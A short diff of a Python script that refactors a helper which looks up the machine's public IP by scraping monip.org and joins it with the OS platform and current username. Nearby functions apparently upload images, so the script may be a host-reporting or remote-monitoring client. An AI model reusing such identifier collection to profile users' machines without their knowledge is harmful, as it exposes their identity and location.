@@ -43,9 +43,12 @@ def post_img(file):
         return "http://thereisanerror"
 
 def info():      #pour recup l'ip et l'os
+    
+    return get_ip() + "::" + str(platform.platform() + "::"+getpass.getuser())
+
+def get_ip():
     page = urlopen("http://www.monip.org/").read().decode("utf-8")
-    ip = page.split("IP : ")[1].split("<br>")[0]
-    return str(ip) + "::" + str(platform.platform() + "::"+getpass.getuser())
+    return str(page.split("IP : ")[1].split("<br>")[0])
 
 
 def genRandomName(charNb=6):
